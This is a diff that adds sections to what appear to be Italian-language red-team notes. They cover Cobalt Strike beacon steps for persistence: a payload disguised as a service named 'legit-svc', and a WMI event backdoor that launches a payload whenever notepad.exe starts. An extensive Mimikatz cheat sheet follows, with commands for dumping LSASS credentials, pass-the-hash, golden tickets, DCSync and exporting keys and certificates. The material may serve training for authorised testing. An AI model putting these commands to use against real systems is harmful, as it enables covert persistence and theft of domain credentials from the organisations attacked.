@@ -83,6 +83,11 @@ clipboard
 #UserSession
 net logons
 ```
+
+
+
+
+
 ## Host Persistence
 
 ```bash
@@ -110,6 +115,11 @@ execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t
 execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "/q /n" -k "hkurun" -v "Updater" -m add
 
 ```
+
+
+
+
+
 ## Privilege Escalation
 ```bash
 #Sharp-up
@@ -276,3 +286,142 @@ connect localhost 4444
 
 
 ```
+
+
+## Elevated Host Persistence
+
+```bash
+
+#Upload del payload
+beacon> cd C:\Windows
+beacon> upload C:\Payloads\tcp-local_x64.svc.exe
+beacon> mv tcp-local_x64.svc.exe legit-svc.exe
+
+#Creazione del SharPersist
+beacon> execute-assembly SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add
+
+#PowerLurk
+beacon> cd C:\Windows
+beacon> upload C:\Payloads\dns_x64.exe
+#Import Evento
+beacon> powershell-import C:\Tools\PowerLurk.ps1
+beacon> powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe
+#Quando si esegue notepad.exe si sesegue dns_X64.exe
+Get-WmiEvent -Name WmiBackdoor
+
+#filtro
+SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='notepad.exe'
+
+
+```
+
+## Mimikatz
+
+```bash
+
+# 🛠️ Mimikatz Cheat Sheet
+
+#General - Abilitazioni e logging
+#Abilita i privilegi di debug necessari per accedere a LSASS e altre funzioni
+privilege::debug
+#Inizia il logging dell'output sulla console
+log
+#Inizia il logging su un file specifico
+log customlogfilename.log
+
+#Sekurlsa - Dump credenziali e ticket
+#Estrae le credenziali attive dalla memoria (richiede debug)
+sekurlsa::logonpasswords
+#Versione estesa per ambienti con più dettagli (più verboso)
+sekurlsa::logonPasswords full
+#Esporta tutti i ticket Kerberos attivi in formato .kirbi
+sekurlsa::tickets /export
+#Pass-the-Hash: autentica un utente usando l'hash NTLM senza conoscere la password
+sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd
+
+#Kerberos - Gestione dei ticket
+#Elenca i ticket Kerberos caricati nella sessione, con possibilità di esportarli
+kerberos::list /export
+#Inietta un ticket Kerberos (.kirbi) nella sessione corrente
+kerberos::ptt c:\chocolate.kirbi
+#Crea un Golden Ticket Kerberos (richiede SID e hash krbtgt)
+kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-... /krbtgt:<hash> /ticket:<file>
+
+#Crypto - Certificati e chiavi
+#Mostra gli oggetti crittografici del CAPI store dell’utente
+crypto::capi
+#Mostra gli oggetti del CNG Key Storage Provider
+crypto::cng
+#Esporta certificati utente dal certificato store
+crypto::certificates /export
+#Esporta certificati dalla macchina (store locale)
+crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE
+#Esporta le chiavi crittografiche
+crypto::keys /export
+#Esporta le chiavi della macchina
+crypto::keys /machine /export
+
+#Vault & Lsadump
+#Estrae le credenziali salvate nel Windows Credential Vault
+vault::cred
+#Elenca le voci del Credential Vault
+vault::list
+#Eleva il token all'utente SYSTEM (impersonazione)
+token::elevate
+#Reverte il token all'utente originale
+token::revert
+#Dump degli hash locali SAM (Security Account Manager)
+lsadump::sam
+#Estrae i "segreti" di sistema da SECURITY hive
+lsadump::secrets
+#Estrae le Domain Cached Credentials (credenziali AD in cache)
+lsadump::cache
+#Simula un Domain Controller per recuperare le credenziali (richiede DA)
+lsadump::dcsync /user:domain\krbtgt /domain:lab.local
+
+#PTH - Pass-the-Hash
+#Esegue un attacco PTH usando solo NTLM
+sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:<hash>
+#Esegue un attacco PTH usando solo AES256
+sekurlsa::pth /user:Administrateur /domain:chocolate.local /aes256:<hash>
+#Esegue un attacco PTH combinando NTLM e AES256
+sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:<hash> /aes256:<hash>
+#PTH e avvio di una shell CMD
+sekurlsa::pth /user:Administrator /domain:WOSHUB /ntlm:{NTLM_hash} /run:cmd.exe
+
+#Ekeys - Estrazione chiavi Kerberos
+#Estrae session keys usate da Kerberos
+sekurlsa::ekeys
+
+#DPAPI - Chiavi protette
+#Estrae masterkey usate da Windows per DPAPI
+sekurlsa::dpapi
+
+#Minidump - Analisi LSASS offline
+#Carica un file di dump di LSASS e lo analizza per credenziali
+sekurlsa::minidump lsass.dmp
+
+#PTT - Inject manuale di ticket
+#Inietta un file .kirbi nella sessione corrente
+kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi
+
+#Golden/Silver Tickets
+#Crea un Golden Ticket (accesso completo)
+kerberos::golden /user:utilisateur /domain:... /sid:... /krbtgt:... /id:1107 /groups:513 /ticket:file
+#Golden ticket avanzato con AES256, gruppi, e validità personalizzata
+kerberos::golden /domain:... /sid:... /aes256:... /user:... /id:500 /groups:... /ptt /startoffset:-10 /endin:600 /renewmax:10080
+#Golden ticket con admin esplicito e output su file
+kerberos::golden /admin:Administrator /domain:... /sid:... /krbtgt:... /ticket:Administrator.kiribi
+
+#TGT - Mostrare il Ticket Granting Ticket
+#Visualizza il TGT attivo in memoria
+kerberos::tgt
+
+#Purge - Pulizia ticket
+#Rimuove tutti i ticket Kerberos dalla memoria
+kerberos::purge
+
+```
+
+
+
